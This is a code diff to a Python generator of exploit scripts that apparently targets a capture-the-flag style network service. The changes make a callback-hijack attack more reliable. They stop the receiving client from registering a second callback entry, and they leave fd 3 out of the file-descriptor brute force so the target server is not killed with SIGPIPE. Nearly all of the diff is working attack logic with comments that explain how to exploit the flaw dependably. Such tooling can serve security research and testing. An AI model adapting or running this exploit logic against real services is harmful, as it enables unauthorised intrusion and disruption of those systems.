@@ -481,14 +481,19 @@ def _emit_exploit(exe_path, flag_func, struct_size, port, ws, verbs, route="unkn
             def attempt(price):
                 receiver = conn()
                 send(receiver, "{login}receiver"); recv(receiver)
-                send(receiver, "{watch}")
-                reply = recv(receiver)
                 # the value the flag's callee routes on: a session id it echoes
-                # as "#N" (ROUTE=id), or the server's fd for this socket (ROUTE=fd)
+                # as "#N" (ROUTE=id), or the server's fd for this socket (ROUTE=fd).
+                # For ROUTE=fd the receiver must stay a plain client, not a
+                # watcher - its own WATCH would plant a *second*, never-freed
+                # callback entry that BID also fires every round, writing the
+                # flag to whatever small int its own session id happens to be
+                # (stdout, a stale fd, ...) instead of to the hijacked entry's
+                # target, and eventually SIGPIPE-killing the server outright.
                 if ROUTE == "fd":
                     auto = server_fd_for(receiver.getsockname()[1])
                 else:
-                    auto = session_id(reply)
+                    send(receiver, "{watch}")
+                    auto = session_id(recv(receiver))
                 target = price if price is not None else auto
                 if target is None:
                     drain(receiver)
@@ -534,7 +539,12 @@ def _emit_exploit(exe_path, flag_func, struct_size, port, ws, verbs, route="unkn
             rounds = int(os.environ.get("TRIAGE_ROUNDS", "2"))
             # None -> attempt() derives it (session id, or /proc fd for ROUTE=fd);
             # then a short brute over the plausible low range for this route.
-            brute = list(range(3, 16)) if ROUTE == "fd" else [1, 2, 3, 4, 5, 6, 7, 8]
+            # fd=3 is excluded: a single-listen-socket accept loop opens its
+            # listening socket right after the inherited 0/1/2, so fd 3 is
+            # almost always that socket - writing to it returns EPIPE, and an
+            # unhandled SIGPIPE kills the whole service, poisoning every
+            # attempt after it for the rest of this run.
+            brute = list(range(4, 16)) if ROUTE == "fd" else [1, 2, 3, 4, 5, 6, 7, 8]
             tries = [int(fixed)] if fixed else [None, *brute]
             for rnd in range(rounds):
                 for price in tries:
